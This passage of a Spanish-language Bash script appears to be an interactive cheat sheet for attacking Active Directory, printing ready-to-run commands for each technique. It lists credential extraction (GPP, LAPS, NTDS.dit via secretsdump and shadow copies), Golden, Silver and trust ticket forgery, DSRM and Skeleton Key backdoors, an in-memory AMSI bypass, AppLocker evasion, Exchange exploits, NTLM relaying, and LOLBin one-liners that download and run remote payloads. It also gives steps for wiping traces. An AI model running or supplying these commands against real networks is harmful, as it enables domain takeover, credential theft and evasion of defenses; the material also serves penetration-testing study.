    echo -e "${MAGENTA}Objetivo:${NC} Encontrar y descifrar contraseñas almacenadas en archivos de configuración de GPO dentro de SYSVOL."
    echo -e "${MAGENTA}Requisitos:${NC} Acceso de lectura al recurso compartido SYSVOL del dominio (generalmente permitido a todos los usuarios autenticados)."
    echo -e "${MAGENTA}Herramientas útiles:${NC} findstr, PowerSploit, gpp-decrypt."
    echo -e "${MAGENTA}Notas:${NC} Esta es una vulnerabilidad antigua (MS14-025) pero todavía se encuentran contraseñas en entornos mal gestionados. Estas credenciales a menudo corresponden a cuentas de administrador local o de servicio."
    press_enter
}

laps_passwords_info() {
    show_banner
    echo -e "${GREEN}Extracción de Contraseñas LAPS:${NC}"
    echo
    show_command "Get-ADComputer -Identity COMPUTER_NAME -Properties ms-Mcs-AdmPwd" "Leer la contraseña LAPS de un equipo específico"
    show_command "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object { \$_.\\\'ms-Mcs-AdmPwd\\\' -ne \\\$null }" "Encontrar todos los equipos con la contraseña LAPS visible para ti"
    echo -e "${MAGENTA}Objetivo:${NC} Extraer las contraseñas de administrador local de las computadoras, que son gestionadas por LAPS."
    echo -e "${MAGENTA}Requisitos:${NC} Permisos delegados en AD para leer el atributo 'ms-Mcs-AdmPwd' de los objetos de computadora."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Módulo LAPS de PowerShell, PowerView."
    echo -e "${MAGENTA}Notas:${NC} LAPS (Local Administrator Password Solution) es una medida de seguridad, pero si un atacante compromete una cuenta con permisos de lectura delegados (como un Help Desk), puede escalar privilegios masivamente en la red."
    press_enter
}

# --- Movimiento Lateral ---

wmi_exec_info() {
    show_banner
    echo -e "${GREEN}Ejecución Remota con WMI:${NC}"
    echo
    show_command "wmic /node:\"$TARGET_IP\" /user:\"$USERNAME\" /password:\"$PASSWORD\" process call create \"powershell.exe -enc ...\"" "Ejecución WMI nativa"
    show_command "wmiexec.py $DOMAIN/$USERNAME:'$PASSWORD'@$TARGET_IP" "Obtener una semi-shell interactiva con Impacket"
    echo -e "${MAGENTA}Objetivo:${NC} Ejecutar comandos en sistemas remotos a través de Windows Management Instrumentation."
    echo -e "${MAGENTA}Requisitos:${NC} Credenciales con privilegios de administrador local en el equipo destino y que el firewall permita WMI (puerto 135 y puertos dinámicos)."
    echo -e "${MAGENTA}Herramientas útiles:${NC} wmic, Impacket (wmiexec.py), crackmapexec."
    echo -e "${MAGENTA}Notas:${NC} WMI es un método muy común y a menudo menos monitorizado que PsExec. Es ideal para ejecutar comandos de forma sigilosa."
    press_enter
}

psremote_info() {
    show_banner
    echo -e "${GREEN}Ejecución Remota con PSRemoting / WinRM:${NC}"
    echo
    show_command "Enter-PSSession -ComputerName $TARGET_IP -Credential (Get-Credential)" "Iniciar una sesión de PowerShell interactiva remota"
    show_command "Invoke-Command -ComputerName $TARGET_IP -ScriptBlock { whoami } -Credential ..." "Ejecutar un bloque de script en un equipo remoto"
    echo -e "${MAGENTA}Objetivo:${NC} Ejecutar comandos and scripts de PowerShell en sistemas remotos de forma nativa."
    echo -e "${MAGENTA}Requisitos:${NC} Credenciales válidas, WinRM habilitado en el objetivo (puerto 5985/5986) y permisos de acceso."
    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerShell, evil-winrm."
    echo -e "${MAGENTA}Notas:${NC} Es el método de administración moderno de Windows. Si está habilitado, proporciona un control muy potente y completo sobre el sistema remoto."
    press_enter
}

scheduled_tasks_info() {
    show_banner
    echo -e "${GREEN}Ejecución Remota con Tareas Programadas:${NC}"
    echo
    show_command "schtasks /create /s $TARGET_IP /u $USERNAME /p '$PASSWORD' /tn \"MyTask\" /tr \"C:\\Windows\\System32\\revshell.exe\" /sc onstart /ru system" "Crear tarea para ejecutar un payload al inicio"
    show_command "schtasks /run /s $TARGET_IP /u $USERNAME /p '$PASSWORD' /tn \"MyTask\"" "Ejecutar la tarea inmediatamente"
    show_command "schtasks /delete /s $TARGET_IP /u $USERNAME /p '$PASSWORD' /tn \"MyTask\" /f" "Eliminar la tarea para limpiar las huellas"
    echo -e "${MAGENTA}Objetivo:${NC} Ejecutar código en un sistema remoto creando and ejecutando una tarea programada."
    echo -e "${MAGENTA}Requisitos:${NC} Credenciales con privilegios de administrador local en el objetivo."
    echo -e "${MAGENTA}Herramientas útiles:${NC} schtasks.exe, at.exe (obsoleto pero útil)."
    echo -e "${MAGENTA}Notas:${NC} Es una técnica clásica and fiable. Permite especificar cuándo se ejecutará el comando (ej. en el próximo inicio de sesión de un usuario) and con qué privilegios (ej. SYSTEM)."
    press_enter
}

service_creation_info() {
    show_banner
    echo -e "${GREEN}Ejecución Remota con Creación de Servicios:${NC}"
    echo
    show_command "sc \\\\$TARGET_IP create NewSvc binPath= \"C:\\temp\\payload.exe\"" "Crear un nuevo servicio en el equipo remoto"
    show_command "sc \\\\$TARGET_IP start NewSvc" "Iniciar el servicio para ejecutar el payload"
    show_command "sc \\\\$TARGET_IP delete NewSvc" "Eliminar el servicio para limpiar las huellas"
    echo -e "${MAGENTA}Objetivo:${NC} Subir un ejecutable and ejecutarlo en un sistema remoto creando un servicio de Windows."
    echo -e "${MAGENTA}Requisitos:${NC} Acceso de escritura a alguna carpeta en el objetivo (ej. C:\\Windows\\Temp) and credenciales de administrador local."
    echo -e "${MAGENTA}Herramientas útiles:${NC} sc.exe, psexec.py (automatiza este proceso)."
    echo -e "${MAGENTA}Notas:${NC} Es el método que utiliza la herramienta clásica PsExec. Es ruidoso (crea un servicio visible) pero muy efectivo."
    press_enter
}

# --- Persistencia ---

golden_ticket_info() {
    show_banner
    echo -e "${GREEN}Golden Ticket:${NC}"
    echo
    show_command "lsadump::dcsync /domain:$DOMAIN /user:krbtgt" "Obtener el hash NTLM de la cuenta krbtgt con Mimikatz"
    show_command "kerberos::golden /user:Admin /domain:$DOMAIN /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ptt" "Crear e inyectar un Golden Ticket con Mimikatz"
    show_command "ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain $DOMAIN evil_user" "Crear un Golden Ticket con Impacket (para usar en Linux)"
    echo -e "${MAGENTA}Objetivo:${NC} Crear un ticket de autenticación de Kerberos (TGT) forjado que otorga privilegios de Administrador de Dominio a cualquier cuenta, permitiendo acceso ilimitado and persistente a todo el dominio."
    echo -e "${MAGENTA}Requisitos:${NC} El hash NTLM de la cuenta 'krbtgt' del dominio, el nombre del dominio and el SID del dominio."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Mimikatz, Impacket (ticketer.py)."
    echo -e "${MAGENTA}Notas:${NC} Es la técnica de persistencia de AD por excelencia. Un Golden Ticket es válido por 10 años por defecto. La única forma de invalidar todos los Golden Tickets es cambiando la contraseña de la cuenta 'krbtgt' DOS VECES."
    press_enter
}

silver_ticket_info() {
    show_banner
    echo -e "${GREEN}Silver Ticket:${NC}"
    echo
    show_command "lsadump::dcsync /domain:$DOMAIN /user:HOST_COMPUTER\\$" "Obtener el hash NTLM de una cuenta de máquina (ej. un servidor de archivos)"
    show_command "kerberos::golden /user:Admin /domain:$DOMAIN /sid:DOMAIN_SID /target:fileserver.lab.local /service:cifs /rc4:HOST_HASH /ptt" "Crear e inyectar un Silver Ticket para el servicio CIFS (archivos)"
    echo -e "${MAGENTA}Objetivo:${NC} Crear un ticket de servicio Kerberos (TGS) forjado para acceder a un servicio específico en un servidor específico (ej. archivos SMB, web HTTP)."
    echo -e "${MAGENTA}Requisitos:${NC} El hash de la cuenta de servicio o de la cuenta de máquina que ejecuta el servicio."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Mimikatz."
    echo -e "${MAGENTA}Notas:${NC} A diferencia del Golden Ticket, un Silver Ticket no interactúa con el Domain Controller, lo que lo hace mucho más sigiloso. Su alcance es limitado a un servicio en una máquina, pero puede ser suficiente para acceder a datos críticos."
    press_enter
}

trust_tickets_info() {
    show_banner
    echo -e "${GREEN}Trust Tickets (Abuso de Confianzas):${NC}"
    echo
    show_command "lsadump::dcsync /domain:$DOMAIN /user:$TRUST_DOMAIN\\$\\krbtgt" "Obtener el hash krbtgt de la confianza entre dominios"
    show_command "kerberos::golden /user:Admin /domain:$DOMAIN /sid:SID_A /sids:SID_B_EnterpriseAdmins /krbtgt:TRUST_KEY /target:domainB.local /service:krbtgt" "Crear un ticket para abusar de la confianza and escalar en el dominio B"
    echo -e "${MAGENTA}Objetivo:${NC} Explotar una relación de confianza entre dos dominios para moverse lateralmente and escalar privilegios desde un dominio A (comprometido) a un dominio B (objetivo)."
    echo -e "${MAGENTA}Requisitos:${NC} Dominio A comprometido, una relación de confianza con el Dominio B and la clave de confianza (trust key) o el hash krbtgt del dominio confiado."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Mimikatz, ticketer.py."
    echo -e "${MAGENTA}Notas:${NC} Es una técnica avanzada para movimiento lateral inter-dominio. BloodHound es excelente para visualizar estas relaciones de confianza and encontrar rutas de ataque."
    press_enter
}

dsrm_password_info() {
    show_banner
    echo -e "${GREEN}Persistencia con Contraseña DSRM:${NC}"
    echo
    show_command "mimikatz # lsadump::lsa /patch" "Sincronizar la contraseña de la cuenta DSRM con la de un Domain Admin (ej. Administrator)"
    show_command "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2" "Permitir el inicio de sesión en el DC con la cuenta DSRM a través de la red"
    echo -e "${MAGENTA}Objetivo:${NC} Crear una puerta trasera en un Domain Controller abusando de la cuenta de restauración DSRM (Directory Services Restore Mode)."
    echo -e "${MAGENTA}Requisitos:${NC} Acceso administrativo al Domain Controller."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Mimikatz, ntdsutil."
    echo -e "${MAGENTA}Notas:${NC} La cuenta DSRM es un administrador local del DC. Si se sincroniza su hash con el de una cuenta de dominio and se permite el logon en red, se crea una forma de Pass-the-Hash que no depende de una cuenta de dominio activa."
    press_enter
}

skeleton_key_info() {
    show_banner
    echo -e "${GREEN}Persistencia con Skeleton Key:${NC}"
    echo
    show_command "mimikatz # privilege::debug" "Obtener privilegios de debug"
    show_command "mimikatz # misc::skeleton" "Inyectar el módulo Skeleton Key en el proceso LSASS del DC"
    echo -e "${MAGENTA}Objetivo:${NC} Inyectar un parche en la memoria del Domain Controller que permite a todos los usuarios autenticarse con una contraseña maestra, además de su propia contraseña."
    echo -e "${MAGENTA}Requisitos:${NC} Acceso administrativo al Domain Controller."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Mimikatz."
    echo -e "${MAGENTA}Notas:${NC} Es una técnica de persistencia en memoria, lo que significa que no sobrevive a un reinicio. La contraseña maestra por defecto es 'mimikatz'. Es muy ruidosa and fácil de detectar por soluciones de seguridad modernas (EDR)."
    press_enter
}

# --- Extracción de Datos ---

ntds_extraction_info() {
    show_banner
    echo -e "${GREEN}NTDS.dit Extraction:${NC}"
    echo
    show_command "secretsdump.py -just-dc $DOMAIN/$USERNAME:'$PASSWORD'@$DC_IP -use-vss" "Volcar NTDS remotamente usando Volume Shadow Copy"
    show_command "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\temp\" q q" "Crear una copia de NTDS.dit usando ntdsutil (requiere RDP/shell en el DC)"
    show_command "diskshadow.exe /s C:\\script.txt" "Usar el binario nativo diskshadow para automatizar la copia desde VSS and evadir defensas"
    show_command "secretsdump.py -system SYSTEM.hive -ntds ntds.dit LOCAL" "Extraer hashes offline desde los archivos NTDS.dit and SYSTEM"
    echo -e "${MAGENTA}Objetivo:${NC} Extraer la base de datos de Active Directory (NTDS.dit) para obtener todos los hashes de contraseñas del dominio."
    echo -e "${MAGENTA}Requisitos:${NC} Acceso como Administrador de Dominio (o un grupo equivalente) al Domain Controller."
    echo -e "${MAGENTA}Herramientas útiles:${NC} secretsdump.py, ntdsutil, vssadmin, diskshadow."
    echo -e "${MAGENTA}Notas:${NC} Es el 'santo grial' del pentesting de AD. El archivo SYSTEM es crucial ya que contiene la bootkey necesaria para descifrar el NTDS.dit. El método con 'diskshadow' es más sigiloso que usar 'vssadmin'."
    press_enter
}

shadow_copy_info() {
    show_banner
    echo -e "${GREEN}Uso de Volume Shadow Copy (VSS):${NC}"
    echo
    show_command "vssadmin create shadow /for=C:" "Crear una instantánea (shadow copy) del volumen C:"
    show_command "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit" "Copiar un archivo bloqueado (NTDS.dit) desde la instantánea"
    show_command "vssadmin delete shadows /all" "Eliminar las instantáneas para no dejar rastros"
    echo -e "${MAGENTA}Objetivo:${NC} Acceder and copiar archivos que están bloqueados por el sistema operativo, como NTDS.dit, SAM o SYSTEM."
    echo -e "${MAGENTA}Requisitos:${NC} Privilegios de administrador local en el sistema."
    echo -e "${MAGENTA}Herramientas útiles:${NC} vssadmin, diskshadow, Copy-VSS.ps1 (Nishang)."
    echo -e "${MAGENTA}Notas:${NC} Es la técnica subyacente que utilizan muchas herramientas de dumping de credenciales para poder leer la base de datos de AD mientras el sistema está en funcionamiento."
    press_enter
}

# --- Técnicas de Evasión ---

obfuscation_info() {
    show_banner
    echo -e "${GREEN}Ofuscación de Scripts (PowerShell):${NC}"
    echo
    show_command "Invoke-Obfuscation -ScriptPath script.ps1 -Command 'TOKEN,ALL,1'" "Ofuscar script PowerShell con Invoke-Obfuscation"
    echo -e "${MAGENTA}Objetivo:${NC} Modificar el código de los scripts (especialmente PowerShell) para que sean difíciles de leer and evadan la detección por firmas de antivirus and EDR."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Invoke-Obfuscation, ISE-Steroids, Chameleon."
    echo -e "${MAGENTA}Notas:${NC} La ofuscación es un paso casi obligatorio al usar herramientas como PowerSploit en un entorno protegido. Se pueden ofuscar variables, funciones, strings, etc."
    press_enter
}

amsi_bypass_info() {
    show_banner
    echo -e "${GREEN}AMSI Bypass:${NC}"
    echo
    show_command "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(\$null,\$true)" "Bypass de AMSI basado en memoria (uno de los más comunes)"
    echo -e "${MAGENTA}Objetivo:${NC} Deshabilitar o evadir la Antimalware Scan Interface (AMSI) para poder ejecutar scripts and comandos maliciosos en PowerShell sin ser detectado."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Sitios como amsi.fail, scripts de bypass en GitHub."
    echo -e "${MAGENTA}Notas:${NC} AMSI es una defensa moderna de Windows. Antes de ejecutar herramientas como Invoke-Mimikatz, es necesario ejecutar primero un bypass de AMSI en la sesión de PowerShell."
    press_enter
}

applocker_bypass_info() {
    show_banner
    echo -e "${GREEN}AppLocker Bypass:${NC}"
    echo
    show_command "regsvr32 /s /n /u /i:http://server/payload.sct scrobj.dll" "Usar regsvr32 para ejecutar un script remoto and evadir AppLocker"
    echo -e "${MAGENTA}Objetivo:${NC} Ejecutar código no autorizado en sistemas donde AppLocker restringe la ejecución de programas and scripts."
    echo -e "${MAGENTA}Herramientas útiles:${NC} LOLBAS (Living Off The Land Binaries and Scripts) project."
    echo -e "${MAGENTA}Notas:${NC} La estrategia consiste en usar binarios de confianza de Windows (como regsvr32.exe, msbuild.exe, etc.) para ejecutar código malicioso. Se abusa de la funcionalidad legítima de estos programas."
    press_enter
}

constrained_language_info() {
    show_banner
    echo -e "${GREEN}Constrained Language Mode Bypass:${NC}"
    echo
    show_command "\$ExecutionContext.SessionState.LanguageMode" "Verificar el modo de lenguaje actual de PowerShell"
    echo -e "${MAGENTA}Objetivo:${NC} Escapar del "Modo de Lenguaje Restringido" de PowerShell, que limita severamente los comandos and funcionalidades disponibles."
    echo -e "${MAGENTA}Notas:${NC} Esta es una medida de seguridad que a menudo se implementa junto con AppLocker. Existen varias técnicas para obtener una sesión de PowerShell en 'FullLanguage mode', a menudo abusando de runspaces de .NET o versiones antiguas de PowerShell."
    press_enter
}

# --- Ataques de Exchange ---

privexchange_attack_info() {
    show_banner
    echo -e "${GREEN}PrivExchange Attack:${NC}"
    echo
    show_command "python privexchange.py -ah ATTACKER_IP -u $USERNAME -p '$PASSWORD' -d $DOMAIN $TARGET_IP" "Forzar a Exchange a autenticarse en nuestra máquina"
    show_command "ntlmrelayx.py -t ldaps://$DC_IP --escalate-user $USERNAME" "Recibir la autenticación and usarla para añadir privilegios DCSync al usuario"
    show_command "secretsdump.py -just-dc $DOMAIN/$USERNAME@$DC_IP" "Usar los nuevos privilegios para dumpear hashes de todo el dominio"
    echo -e "${MAGENTA}Objetivo:${NC} Abusar de un privilegio por defecto en Exchange ('Exchange Windows Permissions') para que el servidor de Exchange se autentique contra un atacante, permitiendo un relay a LDAP para escalar privilegios."
    echo -e "${MAGENTA}Requisitos:${NC} Credenciales de cualquier usuario con un buzón de correo en Exchange."
    echo -e "${MAGENTA}Herramientas útiles:${NC} privexchange.py, ntlmrelayx.py."
    echo -e "${MAGENTA}Notas:${NC} Este es un ataque de alto impacto que puede llevar de un usuario estándar a Domain Admin si Exchange no está parcheado o correctamente configurado."
    press_enter
}

cve_2020_0688_info() {
    show_banner
    echo -e "${GREEN}CVE-2020-0688 - Exchange Fixed Cryptographic Key:${NC}"
    echo
    show_command "python cve-2020-0688.py -s EXCHANGE_SERVER_URL -u $USERNAME -p '$PASSWORD' -c 'whoami'" "Explotar la vulnerabilidad para ejecutar comandos como SYSTEM"
    echo -e "${MAGENTA}Objetivo:${NC} Ejecutar código arbitrario como SYSTEM en el servidor de Exchange debido a una clave criptográfica estática en el panel de control (ECP)."
    echo -e "${MAGENTA}Requisitos:${NC} Credenciales de cualquier usuario con buzón de correo and un servidor de Exchange vulnerable."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Scripts de PoC disponibles en GitHub."
    echo -e "${MAGENTA}Notas:${NC} La vulnerabilidad radica en que todas las instalaciones de Exchange compartían la misma 'validationKey'. Esto permite a un atacante crear un payload malicioso, serializarlo con esta clave and enviarlo al servidor para que lo deserialice and ejecute."
    press_enter
}

cve_2018_8581_info() {
    show_banner
    echo -e "${GREEN}CVE-2018-8581 - SSRF en Exchange:${NC}"
    echo
    show_command "python cve-2018-8581.py -u $USERNAME -p '$PASSWORD' -d $DOMAIN -t TARGET_EMAIL" "Explotar la vulnerabilidad de SSRF"
    echo -e "${MAGENTA}Objetivo:${NC} Acceder a buzones de correo de otros usuarios."
    echo -e "${MAGENTA}Requisitos:${NC} Credenciales de usuario válidas, Exchange sin parchear."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Scripts de PoC disponibles en GitHub."
    echo -e "${MAGENTA}Notas:${NC} Vulnerabilidad de Server-Side Request Forgery en Exchange."
    press_enter
}

exchange_enum_info() {
    show_banner
    echo -e "${GREEN}Enumeración de Exchange:${NC}"
    echo
    show_command "nmap -p 443 --script http-owa-version $TARGET_IP" "Detectar versión de Exchange"
    show_command "ruler --domain $DOMAIN --username $USERNAME --password $PASSWORD discover $TARGET_IP" "Enumerar Exchange con Ruler"
    echo -e "${MAGENTA}Objetivo:${NC} Identificar and enumerar servidores Exchange."
    echo -e "${MAGENTA}Herramientas útiles:${NC} nmap, Ruler, MailSniper."
    echo -e "${MAGENTA}Notas:${NC} Los servidores Exchange son objetivos valiosos en entornos AD."
    press_enter
}

# --- Ataques de Relaying ---

ntlm_relaying_info() {
    show_banner
    echo -e "${GREEN}NTLMv2 Relaying:${NC}"
    echo
    show_command "ntlmrelayx.py -tf targets.txt -smbsupport" "Iniciar el servidor de relay NTLM de Impacket"
    echo -e "${MAGENTA}Objetivo:${NC} Interceptar un intento de autenticación NTLM de una víctima and reenviarlo (relay) to a target server to authenticate as the victim."
    echo -e "${MAGENTA}Requisitos:${NC} Posicionamiento Man-in-the-Middle (obtenido con Responder, mitm6, etc.) and que el servidor objetivo tenga la protección de SMB Signing deshabilitada (para relay a SMB)."
    echo -e "${MAGENTA}Herramientas útiles:${NC} ntlmrelayx.py, Responder."
    echo -e "${MAGENTA}Notas:${NC} Es uno de los ataques más comunes en redes internas. El éxito depende en gran medida de que SMB Signing esté deshabilitado en los servidores objetivo."
    press_enter
}

mitm6_relay_info() {
    show_banner
    echo -e "${GREEN}Mitm6 + ntlmrelayx (Ataque IPv6):${NC}"
    echo
    show_command "mitm6 -i eth0 -d $DOMAIN" "Iniciar mitm6 para hacerse pasar por el servidor DNS de IPv6"
    show_command "ntlmrelayx.py -6 -t ldaps://$DC_IP -wh fakewpad.$DOMAIN -l loot" "Recibir las autenticaciones forzadas por mitm6 and hacer relay a LDAPS"
    echo -e "${MAGENTA}Objetivo:${NC} Abusar de la configuración por defecto de Windows (que prefiere IPv6) para realizar un ataque MitM and hacer relay de las autenticaciones de las máquinas del dominio al Domain Controller."
    echo -e "${MAGENTA}Requisitos:${NC} Acceso a la red local and que IPv6 esté habilitado en el dominio (lo está por defecto)."
    echo -e "${MAGENTA}Herramientas útiles:${NC} mitm6, ntlmrelayx.py."
    echo -e "${MAGENTA}Notas:${NC} Esta es una técnica extremadamente efectiva en la mayoría de las redes corporativas modernas. Puede llevar a la compromisión del dominio rápidamente."
    press_enter
}

responder_config_info() {
    show_banner
    echo -e "${GREEN}Configuración de Responder:${NC}"
    echo
    show_command "responder -I eth0 -v" "Modo por defecto: envenena LLMNR/NBT-NS and captura hashes"
    show_command "responder -I eth0 -A" "Modo de análisis: solo escucha and muestra hashes sin envenenar"
    show_command "En /etc/responder/Responder.conf: SMB = Off, HTTP = Off" "Configurar Responder para no capturar hashes, sino para que el tráfico vaya a ntlmrelayx.py"
    echo -e "${MAGENTA}Objetivo:${NC} Envenenar las respuestas de los protocolos LLMNR and NBT-NS en una red local para capturar hashes NTLMv2 o forzar a las víctimas a autenticarse contra una herramienta de relay."
    echo -e "${MAGENTA}Notas:${NC} Es la herramienta fundamental para iniciar ataques de relay. Se debe configurar para que trabaje en conjunto con ntlmrelayx.py, desactivando sus propios servidores SMB and HTTP para no 'robarle' las víctimas."
    press_enter
}

ldap_relay_info() {
    show_banner
    echo -e "${GREEN}Relay a LDAP/S:${NC}"
    echo
    show_command "ntlmrelayx.py -t ldap://$DC_IP --add-computer NEWPC\\$ -c 'dNSHostName=NEWPC.$DOMAIN'" "Hacer relay para crear una nueva cuenta de máquina"
    show_command "ntlmrelayx.py -t ldaps://$DC_IP --delegate-access" "Hacer relay para delegar control sobre un objeto de AD"
    echo -e "${MAGENTA}Objetivo:${NC} Reenviar una autenticación NTLM al servicio LDAP de un DC para modificar el directorio (crear usuarios, añadir miembros a grupos, etc.)."
    echo -e "${MAGENTA}Requisitos:${NC} Que el DC no exija LDAP Signing (activado por defecto en DCs modernos) o usar LDAPS (puerto 636)."
    echo -e "${MAGENTA}Herramientas útiles:${NC} ntlmrelayx.py."
    echo -e "${MAGENTA}Notas:${NC} El relay a LDAP es muy poderoso. Si se tiene el hash de una cuenta de máquina con altos privilegios, se puede usar para dumpear todos los hashes del dominio."
    press_enter
}

smb_relay_info() {
    show_banner
    echo -e "${GREEN}Relay a SMB:${NC}"
    echo
    show_command "ntlmrelayx.py -t smb://$TARGET_IP -c 'whoami'" "Hacer relay a SMB para ejecutar un solo comando"
    show_command "ntlmrelayx.py -t smb://$TARGET_IP -i" "Obtener una shell interactiva a través del relay a SMB"
    echo -e "${MAGENTA}Objetivo:${NC} Reenviar una autenticación NTLM a un servicio SMB para ejecutar comandos en el sistema objetivo."
    echo -e "${MAGENTA}Requisitos:${NC} Que el equipo objetivo tenga SMB Signing deshabilitado. La cuenta cuya autenticación se reenvía debe tener privilegios de administrador local en el objetivo."
    echo -e "${MAGENTA}Herramientas útiles:${NC} ntlmrelayx.py, smbrelayx.py."
    echo -e "${MAGENTA}Notas:${NC} El SMB Signing es la principal mitigación contra este ataque. Usa herramientas como 'nmap --script=smb-security-mode.nse' para verificar si está habilitado en los objetivos antes de lanzar el ataque."
    press_enter
}

# --- Herramientas de Assessment ---

pingcastle_info() {
    show_banner
    echo -e "${GREEN}Ping Castle - Herramienta de Assessment:${NC}"
    echo
    show_command "pingcastle.exe --healthcheck --server $DC_IP" "Realizar un análisis de salud and generar un informe"
    echo -e "${MAGENTA}Objetivo:${NC} Evaluar rápidamente el nivel de madurez de seguridad de un entorno Active Directory and detectar configuraciones erróneas."
    echo -e "${MAGENTA}Notas:${NC} PingCastle es una herramienta excelente tanto para atacantes (para encontrar debilidades) como para defensores (para fortalecer el directorio). Genera informes muy detallados con puntuaciones and recomendaciones."
    press_enter
}

bloodhound_info() {
    show_banner
    echo -e "${GREEN}BloodHound - Mapeo de Relaciones en AD:${NC}"
    echo
    show_command "SharpHound.exe -c All --domain $DOMAIN" "Recolectar datos desde una máquina Windows con el ingestor oficial"
    show_command "bloodhound-python -u $USERNAME -p '$PASSWORD' -d $DOMAIN -ns $DC_IP -c all" "Recolectar datos desde Linux"
    echo -e "${MAGENTA}Objetivo:${NC} Visualizar gráficamente las relaciones de poder and los caminos de ataque en un entorno de Active Directory."
    echo -e "${MAGENTA}Notas:${NC} BloodHound es una herramienta indispensable. Transforma datos complejos de AD en un mapa visual que permite identificar fácilmente cómo un usuario con pocos privilegios puede escalar hasta convertirse en Domain Admin a través de una cadena de relaciones (ej. miembro de un grupo que es admin de una máquina donde un DA ha iniciado sesión)."
    press_enter
}

adape_script_info() {
    show_banner
    echo -e "${GREEN}ADAPE Script - Evaluación and Escalada de Privilegios:${NC}"
    echo
    show_command "powershell.exe -ExecutionPolicy Bypass -File .\\ADAPE.ps1" "Ejecutar el script de evaluación"
    echo -e "${MAGENTA}Objetivo:${NC} Automatizar la enumeración de un dominio and la búsqueda de vectores de escalada de privilegios comunes."
    echo -e "${MAGENTA}Notas:${NC} Es un script de PowerShell que combina muchas de las técnicas de enumeración manual en una sola herramienta, facilitando el descubrimiento de vulnerabilidades and configuraciones erróneas."
    press_enter
}

ranger_info() {
    show_banner
    echo -e "${GREEN}Ranger - Herramienta de Assessment de AD:${NC}"
    echo
    show_command "ranger.py -d $DOMAIN -u $USERNAME -p '$PASSWORD' $DC_IP" "Ejecutar Ranger para un assessment"
    echo -e "${MAGENTA}Objetivo:${NC} Evaluar la seguridad de un entorno Active Directory desde una perspectiva de Red Team."
    echo -e "${MAGENTA}Notas:${NC} Es una herramienta similar a PingCastle pero escrita en Python. Se enfoca en la detección de misconfiguraciones and vulnerabilidades explotables."
    press_enter
}

adexplorer_info() {
    show_banner
    echo -e "${GREEN}AdExplorer - Explorador de Active Directory:${NC}"
    echo
    show_command "AdExplorer.exe" "Abrir la herramienta and conectarse al dominio actual o a uno específico"
    echo -e "${MAGENTA}Objetivo:${NC} Explorar la base de datos de Active Directory de forma rápida and sencilla, tanto en vivo como a través de snapshots."
    echo -e "${MAGENTA}Herramientas útiles:${NC} Es parte de la suite Sysinternals de Microsoft."
    echo -e "${MAGENTA}Notas:${NC} Es como un 'regedit' para Active Directory. Muy útil para navegar por la estructura de objetos, ver atributos, permisos and tomar snapshots offline de la base de datos de AD para un análisis posterior."
    press_enter
}

# --- Métodos de Ejecución y Descarga ---

web_execution_info() {
    show_banner
    echo -e "${GREEN}Descarga y Ejecución desde Web:${NC}"
    echo
    show_command "certutil -urlcache -split -f http://webserver/payload.exe payload.exe" "Descargar archivo usando certutil"
    show_command "bitsadmin /transfer mydownloadjob /download /priority normal http://webserver/payload.exe C:\\Windows\\Temp\\payload.exe" "Descargar archivo usando bitsadmin"
    show_command "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://webserver/payload.exe', 'payload.exe')\"" "Descargar archivo usando PowerShell"
    echo -e "${MAGENTA}Objetivo:${NC} Descargar and ejecutar payloads desde servidores web remotos."
    echo -e "${MAGENTA}Herramientas útiles:${NC} certutil, bitsadmin, PowerShell."
    echo -e "${MAGENTA}Notas:${NC} Los archivos descargados suelen guardarse en: C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\ o C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\"
    press_enter
}

powershell_execution_info() {
    show_banner
    echo -e "${GREEN}Ejecución con PowerShell:${NC}"
    echo
    show_command "powershell -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://webserver/payload.ps1')\"" "Ejecutar script PowerShell desde la web"
    show_command "powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1" "Ejecutar script PowerShell desde WebDAV"
    show_command "powershell -enc BASE64_ENCODED_SCRIPT" "Ejecutar script PowerShell codificado en base64"
    echo -e "${MAGENTA}Objetivo:${NC} Ejecutar código PowerShell de forma remota o codificada."
    echo -e "${MAGENTA}Herramientas útiles:${NC} PowerShell, WebDAV."
    echo -e "${MAGENTA}Notas:${NC} El parámetro -exec bypass evita las restricciones de ejecución de PowerShell. La codificación base64 ayuda a evadir detecciones simples."
    press_enter
}

windows_binaries_info() {
    show_banner
    echo -e "${GREEN}Ejecución con Binarios de Windows:${NC}"
    echo
    show_command "mshta http://webserver/payload.hta" "Ejecutar HTA remotamente"
    show_command "regsvr32 /s /u /i:http://webserver/payload.sct scrobj.dll" "Ejecutar scriptlet COM remotamente"
    show_command "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";o=GetObject(\"script:http://webserver/payload.sct\");window.close();" "Ejecutar JavaScript con rundll32"
    show_command "cscript //E:jscript \\\\webdavserver\\folder\\payload.txt" "Ejecutar JScript con cscript"
    echo -e "${MAGENTA}Objetivo:${NC} Utilizar binarios legítimos de Windows para ejecutar código malicioso (LOLBins)."
    echo -e "${MAGENTA}Herramientas útiles:${NC} mshta, regsvr32, rundll32, cscript."
    echo -e "${MAGENTA}Notas:${NC} Estas técnicas aprovechan binarios firmados por Microsoft para evadir defensas. Son parte de las técnicas 'Living Off The Land' (LOLBins)."
